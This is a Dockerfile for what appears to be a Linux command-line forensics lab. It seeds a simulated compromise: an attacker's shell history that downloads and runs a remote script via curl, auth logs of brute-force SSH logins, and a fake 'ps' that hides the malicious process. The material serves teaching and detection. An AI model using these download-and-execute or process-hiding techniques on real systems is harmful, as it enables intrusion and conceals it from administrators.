# Always a pinned tag (never latest); prefer images with arm64 builds.
FROM ubuntu:24.04

RUN apt-get update \
 && apt-get install -y --no-install-recommends procps less \
 && rm -rf /var/lib/apt/lists/*

# Users, a hidden note and an attacker's shell history.
RUN for u in ana ben cleo; do useradd -m -s /bin/bash "$u"; done \
 && echo "check the cron jobs on web-02" > /home/cleo/.todo-before-leave \
 && printf '%s\n' 'ls -la' 'cd /tmp' 'curl -s http://203.0.113.50/k.sh -o .k.sh' 'chmod +x .k.sh' './.k.sh' 'rm .k.sh' 'exit' \
      > /home/ben/.bash_history \
 && chown ben:ben /home/ben/.bash_history && chmod 600 /home/ben/.bash_history

# Logs to read.
RUN mkdir -p /var/log/web \
 && awk 'BEGIN { srand(7); for (i = 1; i <= 240; i++) { ip = (i == 1) ? "198.51.100.23" : (i == 240) ? "192.0.2.77" : sprintf("10.0.%d.%d", int(rand()*8), int(rand()*250)+1); printf "%s - - [30/Oct/2026:09:%02d:%02d] \"GET /page%d HTTP/1.1\" 200 512\n", ip, int(i/60), i%60, i } }' \
      > /var/log/web/access.log \
 && printf '%s\n' \
      'Oct 30 09:01:10 web-02 sshd[811]: Accepted publickey for ana from 10.0.4.10' \
      'Oct 30 09:02:41 web-02 sshd[822]: Failed password for root from 203.0.113.50' \
      'Oct 30 09:02:44 web-02 sshd[822]: Failed password for root from 203.0.113.50' \
      'Oct 30 09:03:02 web-02 login[901]: FAILED LOGIN (1) on tty1 FOR ben' \
      'Oct 30 09:03:15 web-02 sshd[830]: Failed password for invalid user admin from 203.0.113.50' \
      'Oct 30 09:04:00 web-02 sudo: pam_unix(sudo:auth): authentication failed for cleo' \
      'Oct 30 09:05:12 web-02 sshd[845]: Accepted password for ben from 203.0.113.50' \
      > /var/log/auth.log

# A fake ps placed ahead of the real one in PATH.
RUN printf '#!/bin/sh\n/usr/bin/ps "$@" | grep -v "[.]k[.]sh"\n' > /usr/local/bin/ps \
 && chmod 755 /usr/local/bin/ps

RUN echo 'echo "Lab linux-cli-intro: tasks are in labs/linux-cli-intro/README.md. Check from the host with: ./lab check linux-cli-intro"' >> /root/.bashrc

WORKDIR /root
CMD ["sleep", "infinity"]
